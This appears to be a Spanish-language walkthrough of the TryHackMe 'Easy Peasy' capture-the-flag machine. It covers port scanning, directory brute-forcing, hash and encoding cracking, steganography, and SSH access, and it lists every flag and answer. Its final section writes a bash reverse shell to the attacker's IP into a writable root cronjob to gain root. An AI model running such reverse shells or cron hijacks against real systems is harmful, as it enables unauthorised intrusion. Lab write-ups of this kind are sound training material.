# Maquina Easy Peasy - TryHackMe
Maquina resuelta y con flags

## Enumeración de puertos
```bash
sudo nmap -sS -sV -O -T4 -p- -Pn 10.10.225.146
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 07:02 EDT
Nmap scan report for 10.10.225.146
Host is up (0.048s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/13%OT=80%CT=1%CU=35117%PV=Y%DS=2%DC=I%G=Y%TM=684C
OS:0591%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=101%GCD=2%ISR=108%TI
OS:=Z%CI=Z%II=I%TS=A)OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M
OS:509ST11NW6%O5=M509ST11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B
OS:3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.39 seconds
```
## Task 1
```
* How many ports are open? 3
* What is the version of nginx? 1.16.1
* What is running on the highest port? Apache
```
## Task 2

### Flag1
```
gobuster dir -u http://10.10.44.25 -w /home/kali/Downloads/subdomains-top1mil-20000.txt -x html,php,txt -t 50 
...
/index.html           (Status: 200) [Size: 612]
/hidden               (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/]

$ gobuster dir -u http://10.10.44.25/hidden -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50

/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.44.25/hidden/whatever/]

```
En el directorio --> http://10.10.225.146/hidden/whatever/ click derecho y view page source y hay un hidden con ZmxhZ3tmMXJzN19mbDRnfQ==
```
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

Copiar el contenido ZmxhZ3tmMXJzN19mbDRnfQ== y usar la web Cyberchef o john en base64

* Flag 1 : flag{f1rs7_fl4g}

## Flag2

```
gobuster dir -u http://10.10.225.146 -w /usr/share/dirb/wordlists/big.txt -x html,php,txt -t 50
...
/hidden               (Status: 301) [Size: 169] [--> http://10.10.225.146/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
/robots.txt           (Status: 200) [Size: 43]
```
Con la herramietna dirb encontrar un robots.txt --> http://10.10.225.146:65524/robots.txt 
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

User-Agent:a18672860d0510e5ab6699730763b250 hash en formato MD5, deshashear con la web md5hashing.net . Resultado : flag{1m_s3c0nd_fl4g}

* Flag 2 : flag{1m_s3c0nd_fl4g}

## Flag 3 
```
Buscar en el puerto 65524 donde esta el Apache. En el browser --> 10.10.225.146:65524 , click derecho y view page source.

Bajar y buscar la Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
```
* Flag 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}

## What is the hidden directory?
```
En el 10.10.225.146:65524 click derecho y view page source y buscar un hiden que contiene : its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu 

Ahora con ObsJmP173N2X6dOrAgEAL0Vu descifran con Cybercheft From base62. Resultado : /n0th1ng3ls3m4tt3r
```
* Respuesta : /n0th1ng3ls3m4tt3r

## Crack the hash what's is the password ? 

Entar en el directorio http://10.10.225.146:65524/n0th1ng3ls3m4tt3r/ y click derecho y view page source. 

```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

Copiar el contenido de p y desencriptar con la web md5hashing.net

* Respuesta : mypasswordforthatjob

## What is the password to login to the machine via SSH?

En view page source de antes descargar la imagen binarycodepixabay.jpg. Usar la herramienta steghide

```bash
steghide extract -sf Untitled.jpeg  (nombre de la imagen)
```

Pedirá una contraseña que es la respuesta de la pregunta anterior mypasswordforthatjob. 
Cat al archivo extraido secrettext.txt , el password usar cyberchef. 

* Respuesta : iconvertedmypasswordtobinary

## Conectarse por ssh

User y contraseña en el archivo secrettext.txt
user : boring
Contraseña : iconvertedmypasswordtobinary

```bash
sudo ssh boring@10.10.225.146 -p6498
```
-p6498 por que es el puerto que han puesto que corra el ssh

```
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}

```
Como la flag a sido rotada  

```bash
echo "a0jvgf33zfa0ez4y" | tr 'a-z' 'n-za-m'  # ROT13
```

* Flag user : flag{n0wits33msn0rm4l}

## Root
Mirar el crontab en busca de cronjobs
```
cat /etc/crontab
```
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
Hay un cronjob que lo ejecuta el user root --> /var/www/.mysecretcronjob.sh 
```
boring@kral4-PC:/$ cd /var/www/
boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh

* Dentro introducir una reverse shell, poner la ip del atacante y un puerto, guardar ctrl + o, cerrar ctrl + x, enter :

#!/bin/bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1

* Abrir otra terminal y escuchar con : nc -lvnp 4444  y esperar

Una vez estemos conectados con root --> cd /root
cat .root.txt
```

* Flag root : flag{63a9f0ea7bb98050796b649e85481845}
